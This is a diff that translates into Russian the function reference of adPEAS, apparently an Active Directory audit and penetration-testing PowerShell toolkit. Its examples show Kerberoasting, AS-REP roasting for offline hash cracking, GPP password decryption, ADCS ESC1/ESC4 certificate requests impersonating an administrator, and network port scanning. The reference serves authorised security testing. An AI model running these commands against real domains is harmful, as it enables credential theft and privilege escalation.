@@ -398,19 +398,19 @@ $name = ConvertFrom-SID -SID "S-1-5-18"
 - Общеизвестные SID обрабатываются без LDAP-запросов.
 - Для SID из других доменов того же леса автоматически используется глобальный каталог (порты 3268/3269). Соединение GC создаётся по необходимости через `Get-GCConnection` и сохраняется в `$Script:GCConnection` на время сеанса.
 - Если GC недоступен, возвращается представление на основе RID (например, `FOREIGN\DomainAdmins (RID:512)`).
-- Returns original SID if resolution fails
+- При невозможности разрешить имя возвращается исходный SID.
 
 ---
 
 ### ConvertTo-LDAPSIDHex
 
-Converts a SID string to LDAP binary hex format for queries.
+Преобразует строковый SID в двоичный LDAP-формат с HEX-экранированием для фильтров.
 
 ```powershell
 $sidHex = ConvertTo-LDAPSIDHex -SIDString "S-1-5-21-123456789-123456789-123456789-500"
-# Returns: \01\05\00\00\00\00\00\05\15\00\00\00...
+# Результат: \01\05\00\00\00\00\00\05\15\00\00\00...
 
-# Use in LDAP filter
+# Использование в LDAP-фильтре
 $user = Get-DomainObject -LDAPFilter "(objectSid=$sidHex)"
 ```
 
@@ -418,77 +418,77 @@ $user = Get-DomainObject -LDAPFilter "(objectSid=$sidHex)"
 
 ### Test-IsPrivileged
 
-Determines the security category of an identity in Active Directory. Returns a detailed PSCustomObject with classification information.
+Определяет категорию безопасности субъекта в Active Directory. Возвращает подробный PSCustomObject со сведениями о классификации.
 
 ```powershell
-# Check by SID - returns detailed result
+# Проверка по SID с подробным результатом
 $result = Test-IsPrivileged -Identity "S-1-5-21-...-512"
 $result.Category      # "Privileged"
 $result.IsPrivileged  # $true
 $result.Reason        # "Privileged group (RID suffix -512)"
 
-# Check Operator group
+# Проверка группы операторов
 $result = Test-IsPrivileged -Identity "S-1-5-32-548"
 $result.Category      # "Operator"
-$result.IsPrivileged  # $false (Operators not privileged by default)
+$result.IsPrivileged  # $false (по умолчанию операторы не считаются привилегированными)
 
-# Include Operators as privileged
+# Считать операторов привилегированными
 $result = Test-IsPrivileged -Identity "S-1-5-32-548" -IncludeOperators
 $result.IsPrivileged  # $true
 
-# Check Exchange service group
+# Проверка служебной группы Exchange
 $result = Test-IsPrivileged -Identity "Organization Management"
 $result.Category      # "ExchangeService"
-$result.IsPrivileged  # $false (by-design permissions, not considered privileged)
+$result.IsPrivileged  # $false (штатные права, не считается привилегированной группой)
 ```
 
-**Parameters**:
+**Параметры**:
 
-| Parameter | Description |
+| Параметр | Описание |
 |-----------|-------------|
-| `-Identity` | SID, DN, AD Object, or sAMAccountName to check |
-| `-IncludeOperators` | Treat Operator category as Privileged |
-| `-NoCache` | Bypass result cache |
+| `-Identity` | SID, DN, объект AD либо sAMAccountName для проверки |
+| `-IncludeOperators` | Считать категорию Operator привилегированной |
+| `-NoCache` | Не использовать кеш результатов |
 
-**Return Object** (always PSCustomObject):
+**Возвращаемый объект** (всегда PSCustomObject):
 
-| Property | Type | Description |
+| Свойство | Тип | Описание |
 |----------|------|-------------|
-| `IsPrivileged` | Boolean/Null | `$true`/`$false`/`$null` (affected by IncludeOperators) |
+| `IsPrivileged` | Boolean/Null | `$true`/`$false`/`$null` (учитывает IncludeOperators) |
 | `Category` | String | Privileged, Operator, ExchangeService, BroadGroup, Standard, Unknown |
-| `Reason` | String | Why identity was classified this way |
-| `MatchedSID` | String | The SID that matched (or `$null`) |
-| `MatchedGroup` | String | Group name if matched via membership (or `$null`) |
-| `Identity` | Object | Original identity input |
+| `Reason` | String | Причина выбранной категории |
+| `MatchedSID` | String | Совпавший SID (либо `$null`) |
+| `MatchedGroup` | String | Имя совпавшей группы при определении по членству (либо `$null`) |
+| `Identity` | Object | Исходный аргумент идентификатора |
 
-**Categories**:
+**Категории**:
 
-| Category | IsPrivileged (default) | Examples |
+| Категория | IsPrivileged (по умолчанию) | Примеры |
 |----------|------------------------|----------|
 | Privileged | `$true` | Domain Admins, Enterprise Admins, SYSTEM, Administrators |
 | Operator | `$false` | Account/Server/Backup/Print Operators |
-| ExchangeService | `$false` | Organization Management, Exchange Servers (by-design permissions) |
+| ExchangeService | `$false` | Organization Management, Exchange Servers (штатные полномочия) |
 | BroadGroup | `$false` | Domain Users, Authenticated Users, Everyone |
-| Standard | `$false` | Regular users and groups |
-| Unknown | `$null` | Could not resolve identity |
+| Standard | `$false` | Обычные пользователи и группы |
+| Unknown | `$null` | Не удалось определить субъект |
 
-**Reason Values**:
-- `"Privileged identity (static SID)"` - Well-known privileged SID
-- `"Privileged group (RID suffix -512)"` - Domain-relative privileged group
-- `"Operator group (static SID)"` - Direct Operator group SID
-- `"Member of privileged group"` - Nested in privileged group
-- `"sIDHistory contains privileged SID (SID History Injection risk)"` - CRITICAL: Privileged via sIDHistory
-- And more...
+**Значения Reason**:
+- `"Privileged identity (static SID)"` — общеизвестный привилегированный SID.
+- `"Privileged group (RID suffix -512)"` — привилегированная группа, определённая по RID домена.
+- `"Operator group (static SID)"` — SID одной из групп операторов.
+- `"Member of privileged group"` — вложенное членство в привилегированной группе.
+- `"sIDHistory contains privileged SID (SID History Injection risk)"` — КРИТИЧЕСКИЙ риск: привилегированный SID в sIDHistory.
+- И другие значения.
 
-**SID History Injection Detection**:
+**Выявление внедрения SID History**:
 
-Test-IsPrivileged automatically detects SID History Injection attacks by checking if the identity's sIDHistory attribute contains privileged SIDs:
+`Test-IsPrivileged` автоматически выявляет признаки внедрения SID History: проверяет, содержит ли атрибут sIDHistory субъекта привилегированные SID.
 
 ```powershell
 $result = Test-IsPrivileged -Identity "suspicious_user"
 if ($result.Reason -like "*sIDHistory*") {
-    # CRITICAL: This account has privileged SIDs in sIDHistory!
-    # Possible SID History Injection attack
+    # КРИТИЧНО: в sIDHistory этой учётной записи есть привилегированные SID!
+    # Возможно внедрение SID History
 }
 ```
 
@@ -496,13 +496,13 @@ if ($result.Reason -like "*sIDHistory*") {
 
 ### Get-ObjectOwner
 
-Retrieves the owner of an AD object.
+Получает владельца объекта AD.
 
 ```powershell
 $owner = Get-ObjectOwner -DistinguishedName "CN=Computer01,CN=Computers,DC=contoso,DC=com"
 ```
 
-**Returns**:
+**Возвращает**:
 ```powershell
 @{
     OwnerSID  = "S-1-5-21-..."
@@ -512,86 +512,86 @@ $owner = Get-ObjectOwner -DistinguishedName "CN=Computer01,CN=Computers,DC=conto
 
 ---
 
-## Credential Decryption
+## Расшифровка учётных данных
 
 ### ConvertFrom-GPPPassword
 
-Decrypts Group Policy Preferences (GPP) passwords.
+Расшифровывает пароли Group Policy Preferences (GPP).
 
 ```powershell
-# Decrypt GPP cpassword
+# Расшифровка GPP cpassword
 $clearText = ConvertFrom-GPPPassword -EncryptedPassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 ```
 
-**Background**: GPP passwords use a published AES key and can always be decrypted.
+**Предыстория:** пароли GPP шифруются опубликованным ключом AES и могут быть расшифрованы.
 
-**Use Case**: Found in SYSVOL XML files (Groups.xml, Drives.xml, etc.)
+**Где встречается:** XML-файлы в SYSVOL (Groups.xml, Drives.xml и др.).
 
 ---
 
 ### ConvertFrom-VBE
 
-Decodes VBScript Encoded (.vbe) scripts.
+Декодирует сценарии VBScript Encoded (.vbe).
 
 ```powershell
-# Decode from encoded string
+# Декодировать строку в VBE
 $script = ConvertFrom-VBE -EncodedScript "#@~^AAAA..."
 
-# Decode from file content
+# Декодировать содержимое файла
 $vbeContent = Get-Content "logon.vbe" -Raw
 $script = ConvertFrom-VBE -EncodedScript $vbeContent
 ```
 
-**Parameter**: `-EncodedScript` (String, mandatory, accepts pipeline input) - The VBE-encoded content to decode.
+**Параметр:** `-EncodedScript` (String, обязательный, принимает данные конвейера) — содержимое VBE для декодирования.
 
-**Use Case**: Logon scripts may be encoded and contain credentials.
+**Где встречается:** сценарии входа могут быть закодированы и содержать учётные данные.
 
 ---
 
-## Testing Functions
+## Функции тестирования
 
 ### Invoke-Kerberoast
 
-Unified Kerberoasting module that automatically selects the appropriate method based on authentication context.
+Универсальный модуль Kerberoasting: автоматически выбирает метод с учётом типа аутентификации.
 
-**Two Kerberoasting methods (automatically selected):**
-- **Windows API**: Uses existing Windows ticket cache (Kerberos/SSPI auth)
-- **In-Memory**: Own Kerberos stack (SimpleBind auth or explicit credentials)
+**Два метода Kerberoasting (выбор автоматический):**
+- **Windows API:** использует существующий кеш билетов Windows (Kerberos/SSPI).
+- **В памяти:** собственная реализация Kerberos (аутентификация SimpleBind либо явно заданные учётные данные).
 
-**Parameters:**
+**Параметры:**
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `InputObject` | PSCustomObject | Pipeline input from Get-DomainUser |
-| `SAMAccountName` | String | Target user's sAMAccountName |
-| `SPN` | String | Target Service Principal Name |
-| `Domain` | String | Target domain |
-| `Server` | String | Domain Controller to use |
-| `Credential` | PSCredential | Credentials for in-memory method |
-| `Username` | String | Username for in-memory method |
-| `Password` | String | Password for in-memory method |
-| `CleanupTickets` | Switch | Remove TGS ticket from cache after extraction (Windows API only) |
+| `InputObject` | PSCustomObject | Объект из конвейера `Get-DomainUser` |
+| `SAMAccountName` | String | sAMAccountName целевого пользователя |
+| `SPN` | String | Целевое имя участника службы SPN |
+| `Domain` | String | Целевой домен |
+| `Server` | String | Используемый контроллер домена |
+| `Credential` | PSCredential | Учётные данные для метода в памяти |
+| `Username` | String | Имя пользователя для метода в памяти |
+| `Password` | String | Пароль для метода в памяти |
+| `CleanupTickets` | Switch | Удалить билет TGS из кеша после извлечения (только Windows API) |
 
-**Usage Examples:**
+**Примеры использования:**
 
 ```powershell
-# Pipeline from Get-DomainUser (recommended)
+# Конвейер от Get-DomainUser (рекомендуется)
 Get-DomainUser -SPN -Enabled | Invoke-Kerberoast
 
-# By SAMAccountName (looks up SPN automatically)
+# По SAMAccountName (автоматический поиск SPN)
 Invoke-Kerberoast -SAMAccountName "svc_sql"
 
-# By SPN directly (looks up username automatically)
+# Непосредственно по SPN (автоматический поиск имени пользователя)
 Invoke-Kerberoast -SPN "MSSQLSvc/db01.contoso.com:1433"
 
-# Both parameters (fastest - no lookups needed)
+# Оба параметра (быстрее, дополнительные запросы не нужны)
 Invoke-Kerberoast -SAMAccountName "svc_sql" -SPN "MSSQLSvc/db01.contoso.com:1433"
 
-# With explicit credentials (forces in-memory method)
+# Явные учётные данные (выбирается метод в памяти)
 Invoke-Kerberoast -SAMAccountName "svc_sql" -Credential (Get-Credential)
 ```
 
-**Return Object:**
+**Возвращаемый объект:**
 ```powershell
 [PSCustomObject]@{
     Success          = $true/$false
@@ -606,105 +606,105 @@ Invoke-Kerberoast -SAMAccountName "svc_sql" -Credential (Get-Credential)
 }
 ```
 
-**Output**: Hashcat-compatible hash (mode 13100 for RC4, 19700 for AES)
+**Результат:** хеш, совместимый с Hashcat (режим 13100 для RC4, 19700 для AES).
 
 ---
 
 ### Invoke-ASREPRoast
 
-Sends AS-REQ without pre-authentication to extract the AS-REP hash for offline cracking. Uses raw Kerberos protocol (TCP/UDP port 88) to communicate directly with the KDC.
+Отправляет AS-REQ без предварительной аутентификации и извлекает AS-REP-хеш для автономного подбора. Использует непосредственно протокол Kerberos (TCP/UDP, порт 88) для связи с KDC.
 
-**Parameters:**
+**Параметры:**
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `SAMAccountName` | String | Target user's sAMAccountName (required) |
-| `Domain` | String | Target domain FQDN (optional, uses session domain) |
-| `DomainController` | String | Specific DC to query (optional, uses session DC or auto-discovered) |
+| `SAMAccountName` | String | sAMAccountName целевого пользователя (обязателен) |
+| `Domain` | String | FQDN целевого домена (необязательно, берётся из сеанса) |
+| `DomainController` | String | Целевой DC (необязательно, из сеанса либо автообнаружение) |
 
-**Usage Examples:**
+**Примеры использования:**
 
 ```powershell
-# With active session (recommended) — Domain/DC from Connect-adPEAS
+# При активном сеансе (рекомендуется): домен/DC берутся из Connect-adPEAS
 $result = Invoke-ASREPRoast -SAMAccountName "vulnuser"
 
-# Explicit domain
+# Домен задан явно
 $result = Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com"
 
-# With specific Domain Controller
+# Указан определённый контроллер домена
 $result = Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com" -DomainController "dc01.contoso.com"
 
-# Check result
+# Проверка результата
 if ($result.Success) {
-    $result.Hash          # Hashcat/John compatible hash
+    $result.Hash          # Хеш для Hashcat/John
     $result.Severity      # "CRITICAL" (RC4), "HIGH" (AES128), "MEDIUM" (AES256)
 }
 ```
 
-**Return Object:**
+**Возвращаемый объект:**
 ```powershell
 [PSCustomObject]@{
     SAMAccountName     = "vulnuser"
     Success            = $true/$false
     EncryptionType     = 23                  # 23=RC4, 17=AES128, 18=AES256
     EncryptionTypeName = "RC4-HMAC"
-    Severity           = "CRITICAL"          # Based on encryption type
+    Severity           = "CRITICAL"          # В зависимости от шифрования
     Description        = "Very fast to crack"
     Hash               = "$krb5asrep$23$vulnuser@CONTOSO.COM:checksum$encrypted"
     Error              = $null / "Error message"
 }
 ```
 
-**Output**: Hashcat-compatible hash (mode 18200 for RC4, mode 19600 for AES)
+**Результат:** хеш, совместимый с Hashcat (режим 18200 для RC4, 19600 для AES).
 
 ---
 
-## ADCS Certificate Enrollment
+## Запрос сертификатов AD CS
 
 ### Request-ADCSCertificate
 
-Requests a certificate from an ADCS Certificate Authority with automatic submission method detection and fallback.
+Запрашивает сертификат в центре сертификации AD CS с автоматическим определением доступного способа подачи заявки и резервными вариантами.
 
-**Submission Methods** (automatic fallback):
-1. **HTTPS Web Enrollment** (`/certsrv/`) - Primary method
-2. **HTTP Web Enrollment** (`/certsrv/`) - Fallback if HTTPS unavailable
-3. **ICertRequest COM/RPC** (DCOM) - Fallback if Web Enrollment disabled/blocked
+**Способы подачи заявки** (автоматический переход к резервному):
+1. **HTTPS Web Enrollment** (`/certsrv/`) — основной метод.
+2. **HTTP Web Enrollment** (`/certsrv/`) — резервный, если HTTPS недоступен.
+3. **ICertRequest COM/RPC** (DCOM) — резервный, если веб-регистрация отключена или блокируется.
 
 ```powershell
-# ESC1 - Impersonate another user
+# ESC1: запрос сертификата на имя другого пользователя
 Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"
 
-# ESC4 - Modify template temporarily, then request
+# ESC4: временно изменить шаблон и подать заявку
 Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"
 
-# Specify CA manually
+# Указать УЦ вручную
 Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Subject "CN=John"
 
-# Custom SANs
+# Пользовательские SAN
 Request-ADCSCertificate -TemplateName "User" -Subject "CN=Admin" -UPN "admin@contoso.com"
 Request-ADCSCertificate -TemplateName "Computer" -Subject "CN=SRV01" -DNS "srv01.contoso.com"
 
-# PFX without password (for scripting)
+# PFX без пароля (для сценариев)
 Request-ADCSCertificate -TemplateName "User" -Subject "CN=Test" -NoPassword
 
-# With explicit credentials
+# Явные учётные данные
 Request-ADCSCertificate -TemplateName "User" -Credential (Get-Credential)
 ```
 
-**Parameters**:
-- `-CAServer` - CA FQDN (auto-discovered if omitted and session exists)
-- `-TemplateName` - Certificate template name (required)
-- `-Impersonate` - Convenience parameter: sets Subject + appropriate SAN automatically
-- `-Subject` - Certificate subject (CN= prefix added if missing)
-- `-UPN` - UPN for SAN (e.g., `admin@contoso.com`)
-- `-DNS` - DNS name for SAN (e.g., `srv01.contoso.com`)
-- `-ModifyTemplate` - ESC4: Backup → Modify → Request → Restore
-- `-NoPassword` - Export PFX without password
-- `-UseHTTP` - Force HTTP (skip HTTPS)
-- `-OutputPath` - Custom PFX path
-- `-PassThru` - Return result object for scripting
+**Параметры**:
+- `-CAServer` — FQDN УЦ (автообнаружение, если параметр не задан и есть сеанс).
+- `-TemplateName` — имя шаблона сертификата (обязательное).
+- `-Impersonate` — вспомогательный параметр: автоматически задаёт Subject и подходящий SAN.
+- `-Subject` — субъект сертификата (префикс CN= добавляется, если отсутствует).
+- `-UPN` — UPN в SAN (например, `admin@contoso.com`).
+- `-DNS` — DNS-имя в SAN (например, `srv01.contoso.com`).
+- `-ModifyTemplate` — ESC4: резервная копия → изменение → заявка → восстановление.
+- `-NoPassword` — экспорт PFX без пароля.
+- `-UseHTTP` — принудительный HTTP (без HTTPS).
+- `-OutputPath` — пользовательский путь к PFX.
+- `-PassThru` — возврат объекта результата для сценариев.
 
-**Return** (with `-PassThru`):
+**Возвращаемый результат** (с `-PassThru`):
 ```powershell
 [PSCustomObject]@{
     Success       = $true
@@ -716,174 +716,174 @@ Request-ADCSCertificate -TemplateName "User" -Credential (Get-Credential)
 }
 ```
 
-**COM/RPC Fallback Details**:
-- Automatically activated when Web Enrollment fails with connection/network errors
-- Uses `ICertRequest` COM interface via DCOM (port 135 + dynamic)
-- Returns certificate immediately (no separate retrieval needed)
-- Requires same permissions as Web Enrollment (Enroll rights on template)
+**Подробности резервного COM/RPC**:
+- Автоматически выбирается, когда веб-регистрация завершается с ошибкой соединения/сети.
+- Использует COM-интерфейс `ICertRequest` через DCOM (порт 135 и динамические порты).
+- Сразу возвращает сертификат (отдельное получение не требуется).
+- Требует тех же разрешений, что и веб-регистрация (право Enroll на шаблоне).
 
-**Edge Cases**:
-- Web Enrollment disabled → COM/RPC used automatically
-- Firewall blocks HTTP/HTTPS → COM/RPC tried (if DCOM allowed)
-- Only HTTP available → Automatic fallback from HTTPS to HTTP
-- No manual intervention needed - best method selected automatically
+**Особые случаи**:
+- Веб-регистрация отключена → автоматически используется COM/RPC.
+- Брандмауэр блокирует HTTP/HTTPS → пробуется COM/RPC (если разрешён DCOM).
+- Доступен только HTTP → автоматический переход с HTTPS на HTTP.
+- Ручное вмешательство не требуется: подходящий способ выбирается автоматически.
 
 ---
 
-## LAPS Utilities
+## Утилиты LAPS
 
 ### Get-LAPSGPOConfig
 
-Parses LAPS Legacy configuration from GPO Registry.pol files. Queries all GPOs and checks their SYSVOL paths for LAPS AdminAccountName settings.
+Разбирает настройки устаревшего Microsoft LAPS из файлов Registry.pol групповых политик. Запрашивает все GPO и проверяет пути SYSVOL на наличие параметра LAPS AdminAccountName.
 
 ```powershell
-# Use session DC (default)
+# Использовать DC текущего сеанса (по умолчанию)
 $config = Get-LAPSGPOConfig
 
-# Specify Domain Controller
+# Указать контроллер домена
 $config = Get-LAPSGPOConfig -DomainController "dc01.contoso.com"
 ```
 
-**Parameter**: `-DomainController` (String, optional) - Domain Controller to use for SYSVOL access.
+**Параметр:** `-DomainController` (String, необязательный) — DC для доступа к SYSVOL.
 
-**Returns**: Hashtable with GPO display name as key and configured AdminAccountName as value.
+**Возвращает:** Hashtable с отображаемым именем GPO в качестве ключа и настроенным AdminAccountName в качестве значения.
 
 ---
 
 ### Get-OUPermissions
 
-Analyzes permissions on an Organizational Unit.
+Анализирует разрешения на организационную единицу (OU).
 
 ```powershell
 $perms = Get-OUPermissions -DistinguishedName "OU=Admins,DC=contoso,DC=com"
 
-# Check for specific permission type
+# Проверка заданного типа разрешений
 $perms = Get-OUPermissions -DistinguishedName "OU=Admins,DC=contoso,DC=com" -CheckType "LAPS"
 ```
 
-**Check Types** (ValidateSet):
-- `All` - All permission checks (default)
-- `GenericAll` - Full Control rights
-- `GenericWrite` - Generic Write (includes WriteProperty on all attributes)
-- `WriteDacl` - Modify permissions (effectively full control)
-- `WriteOwner` - Take ownership (effectively full control)
-- `PasswordReset` - Password reset rights (Extended Right)
-- `AccountControl` - userAccountControl / User-Account-Restrictions modification
-- `GroupMembership` - Group membership modification (member attribute)
-- `SPNModification` - SPN modification (servicePrincipalName, Validated-SPN)
-- `DNSHostName` - DNS hostname modification (dNSHostName, Validated-DNS-Host-Name)
-- `ScriptPath` - Logon script path modification (scriptPath)
-- `Delegation` - Delegation attribute modification (msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity)
-- `LAPS` - LAPS password read (Legacy ms-Mcs-AdmPwd + Windows LAPS attributes)
-- `CredentialRoaming` - read of the Credential Roaming attributes on user objects (ms-PKI-DPAPIMasterKeys, ms-PKI-AccountCredentials, ms-PKI-RoamingTimeStamp)
-- `ObjectCreation` - CreateChild rights (User, Computer, Group, OU creation)
-- `GPOLinking` - GPO link modification (gPLink attribute on OUs)
+**Типы проверок** (ValidateSet):
+- `All` — все проверки разрешений (по умолчанию).
+- `GenericAll` — полный доступ.
+- `GenericWrite` — общее право записи (включает WriteProperty для всех атрибутов).
+- `WriteDacl` — изменение ACL (по сути, полный контроль).
+- `WriteOwner` — получение владения (по сути, полный контроль).
+- `PasswordReset` — сброс пароля (расширенное право).
+- `AccountControl` — изменение userAccountControl / User-Account-Restrictions.
+- `GroupMembership` — изменение членства в группе (атрибут member).
+- `SPNModification` — изменение SPN (servicePrincipalName, Validated-SPN).
+- `DNSHostName` — изменение DNS-имени (dNSHostName, Validated-DNS-Host-Name).
+- `ScriptPath` — изменение пути сценария входа (scriptPath).
+- `Delegation` — изменение атрибутов делегирования (msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity).
+- `LAPS` — чтение пароля LAPS (устаревший ms-Mcs-AdmPwd и атрибуты Windows LAPS).
+- `CredentialRoaming` — чтение атрибутов перемещаемых учётных данных пользователей (ms-PKI-DPAPIMasterKeys, ms-PKI-AccountCredentials, ms-PKI-RoamingTimeStamp).
+- `ObjectCreation` — право CreateChild (создание User, Computer, Group, OU).
+- `GPOLinking` — изменение привязки GPO (атрибут gPLink у OU).
 
-**Finding fields**: `CheckType`, `Right`, `Principal`, `SID`, `Severity`, `InheritedFrom`. `CredentialRoaming` findings additionally carry `GrantsControlAccess`, because a confidential attribute needs `READ_PROPERTY` **and** `CONTROL_ACCESS` while a non-confidential one needs only the former — the schema decides, and only the caller knows what it says.
+**Поля находки:** `CheckType`, `Right`, `Principal`, `SID`, `Severity`, `InheritedFrom`. Для находок `CredentialRoaming` также указывается `GrantsControlAccess`: конфиденциальный атрибут требует **одновременно** `READ_PROPERTY` и `CONTROL_ACCESS`, а неконфиденциальный — только первого права. Решает схема AD; только вызывающая сторона знает эту характеристику.
 
 ---
 
-## GPO Utilities
+## Утилиты GPO
 
 ### Get-GPOLinkage
 
-Queries LDAP for all objects with `gPLink` attribute and returns a hashtable mapping GPO GUIDs to their linked locations. Takes no parameters - uses the active LDAP session.
+Запрашивает LDAP-объекты с атрибутом `gPLink` и возвращает Hashtable, сопоставляющую GUID GPO и места привязки. Не принимает параметров, использует активный сеанс LDAP.
 
 ```powershell
-# Get all GPO linkage information
+# Получить сведения обо всех привязках GPO
 $linkage = Get-GPOLinkage
-$linkage["{6AC1786C-016F-11D2-945F-00C04fB984F9}"]  # Returns array of OUs where this GPO is linked
+$linkage["{6AC1786C-016F-11D2-945F-00C04fB984F9}"]  # Массив OU, к которым привязана GPO
 ```
 
-**Returns**: Hashtable with GPO GUID (uppercase, with braces) as key and array of linked location objects as value.
+**Возвращает:** Hashtable, где ключ — GUID GPO (верхний регистр, с фигурными скобками), а значение — массив объектов мест привязки.
 
 ---
 
-## Network Utilities
+## Сетевые утилиты
 
 ### Invoke-PortScan
 
-A fast TCP connect scan for the system you are working from - no installation, no driver,
-and no waiting on one timeout per port as with `Test-NetConnection`. Connections are started
-a block at a time (`-BatchSize`, 256) and each block gets one deadline (`-TimeoutMs`, 1000),
-so a port that does not answer costs one timeout per block rather than one per probe: 254
-hosts on the 16 default ports that drop every packet take about 20 seconds.
+Быстрое TCP-сканирование установлением соединения с текущего компьютера. Не требует установки программы или драйвера;
+в отличие от `Test-NetConnection`, не ждёт отдельного тайм-аута для каждого порта. Соединения открываются
+пачками (`-BatchSize`, по умолчанию 256), и каждой пачке назначается общий срок ожидания (`-TimeoutMs`, 1000 мс).
+Неответивший порт расходует один тайм-аут на пачку, а не на каждую попытку: например, 254 узла
+по 16 портов по умолчанию, отбрасывающие все пакеты, будут проверены примерно за 20 секунд.
 
-A port is open when a TCP connection to it completes; nothing is sent over it. Refused and
-filtered are not told apart - Windows answers a refused connection only after retrying it
-for about a second.
+Порт считается открытым после успешного TCP-соединения; полезная нагрузка по нему не передаётся. Отказ
+в соединении и фильтрация не различаются: Windows может отвечать на отказ лишь после повторных попыток
+примерно в течение одной секунды.
 
-**Targets:**
-- **Given** with `-Target` or piped in: IPv4 addresses, networks (`10.1.2.0/24`, up to a /16,
-  without the network and broadcast address), ranges (`10.1.2.10-50`,
-  `10.1.2.10-10.1.3.20`) and host names, in any mix - also the objects of the `Get-Domain*`
-  functions, by `dNSHostName`. A name is resolved once, by this machine's resolver, before
-  the scan. An empty pipeline scans nothing.
-- **`-DomainComputers`**: the enabled computers of the domain with a logon in the last 30
-  days (`-ActiveDays`), by DNS name below the domain's own. Their addresses come from the
-  AD-integrated DNS zones over LDAP, as for `Get-NetworkMap`; a name the zones do not hold
-  is resolved at the domain controller, and at no other server. Together with targets
-  given, both are scanned.
+**Цели:**
+- **Заданные** через `-Target` или конвейер: IPv4-адреса, сети (`10.1.2.0/24`, вплоть до /16,
+  без сетевого и широковещательного адреса), диапазоны (`10.1.2.10-50`,
+  `10.1.2.10-10.1.3.20`) и имена узлов в произвольном сочетании, а также объекты функций `Get-Domain*`,
+  из которых берётся `dNSHostName`. Имя разрешается однократно локальным разрешителем перед
+  сканированием. Пустой конвейер не запускает проверку адресов.
+- **`-DomainComputers`**: включённые компьютеры домена, входившие в систему за последние 30 дней
+  (определяется `-ActiveDays`), с DNS-именами внутри собственного домена. Адреса берутся из
+  интегрированных с AD зон DNS по LDAP, как в `Get-NetworkMap`. Если имя отсутствует в зонах,
+  его разрешает контроллер домена, но не другой сервер. Заданные отдельно цели и компьютеры
+  домена сканируются вместе.
 
-A call with neither is refused with an error rather than turned into a scan of the domain.
-`Invoke-adPEAS` does not run a port scan.
+Вызов без `-Target`/данных конвейера и без `-DomainComputers` завершается ошибкой, а не сканированием всего домена.
+`Invoke-adPEAS` не запускает сканирование портов.
 
-Every address is scanned once, however many targets stand for it. What is not scanned is
-named: unusable targets with the reason, names without an address, computers outside the
-domain or without a DNS name.
+Каждый адрес сканируется однократно, даже если указан несколькими способами. Для пропущенных целей
+возвращается причина: неподходящий формат, имя без IP-адреса, компьютер вне домена
+либо без DNS-имени.
 
-**Parameters:**
+**Параметры:**
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `Target` | String[] | Addresses, networks, ranges or host names; pipeline input by value or by `dNSHostName` |
-| `Port` | String[] | Ports and ranges: `445`, `'22,80,443'`, `'1-1024'`. Default: the 16 ports below |
-| `TimeoutMs` | Int | Deadline of one block of connections. Default: 1000 |
-| `BatchSize` | Int | Connections in flight at once. Default: 256 |
-| `DomainComputers` | Switch | Also scans the active computers of the domain |
-| `ActiveDays` | Int | With `-DomainComputers`: how recent a computer's last logon must be. Default: 30 |
-| `ExportOpenPorts` | String | Writes the open ports to a CSV file, one row per port: `IPAddress`, `HostName`, `Port`, `Service` |
-| `PassThru` | Switch | Returns one object per address with an open port: `ComputerName`, `IPAddress`, `OpenPorts` |
-| `Domain` / `Server` / `Credential` | | Connection, for `-DomainComputers` |
+| `Target` | String[] | IP-адреса, сети, диапазоны или имена; данные конвейера по значению или свойству `dNSHostName` |
+| `Port` | String[] | Порты и диапазоны: `445`, `'22,80,443'`, `'1-1024'`. По умолчанию 16 портов ниже |
+| `TimeoutMs` | Int | Общее время ожидания одной пачки соединений; по умолчанию 1000 |
+| `BatchSize` | Int | Число одновременных соединений; по умолчанию 256 |
+| `DomainComputers` | Switch | Дополнительно сканировать активные компьютеры домена |
+| `ActiveDays` | Int | С `-DomainComputers`: возраст последнего входа; по умолчанию 30 дней |
+| `ExportOpenPorts` | String | CSV с открытыми портами (по строке на порт): `IPAddress`, `HostName`, `Port`, `Service` |
+| `PassThru` | Switch | По объекту на адрес с открытыми портами: `ComputerName`, `IPAddress`, `OpenPorts` |
+| `Domain` / `Server` / `Credential` | | Параметры подключения для `-DomainComputers` |
 
-The default ports: 22, 80, 88, 135, 389, 443, 445, 636, 1433, 3389, 5985, 5986, 8080, 8443,
-9080, 9443 - not every service there is, but the ones that say whether a host can be
-reached for what comes next: a remote shell (SSH, RPC, RDP, WinRM over HTTP and HTTPS), the
-domain (Kerberos, LDAP, LDAPS - the last one is what `-PassTheCert` needs), files (SMB), a
-database (MSSQL) and the web ports consoles live on. Any other port is a `-Port` away, and
-is named in the result where adPEAS knows its service.
+Порты по умолчанию: 22, 80, 88, 135, 389, 443, 445, 636, 1433, 3389, 5985, 5986, 8080, 8443,
+9080, 9443. Это не все службы, но типовые порты, по которым можно судить о доступности следующих
+подключений: удалённая оболочка (SSH, RPC, RDP, WinRM через HTTP/HTTPS), доменные службы
+(Kerberos, LDAP, LDAPS; последний необходим для `-PassTheCert`), файлы (SMB), база данных (MSSQL)
+и веб-интерфейсы администрирования. Другие порты можно указать через `-Port`;
+если служба известна adPEAS, её название отображается в результатах.
 
-**Usage Examples:**
+**Примеры использования:**
 
 ```powershell
-# A network on the default ports
+# Сеть и порты по умолчанию
 Invoke-PortScan -Target 10.1.2.0/24
 
-# A range on chosen ports, with a shorter deadline
+# Диапазон адресов и выбранные порты с коротким тайм-аутом
 Invoke-PortScan 10.1.2.10-50 -Port 22,80,443,8000-8100 -TimeoutMs 500
 
-# The subnets Get-NetworkMap -ExportTargets wrote, for SMB, into a CSV
+# Подсети из Get-NetworkMap -ExportTargets: проверка SMB с экспортом CSV
 Get-Content .\subnets.txt | Invoke-PortScan -Port 445 -ExportOpenPorts .\smb.csv
 
-# The hosts a first scan found with WinRM, again on more ports
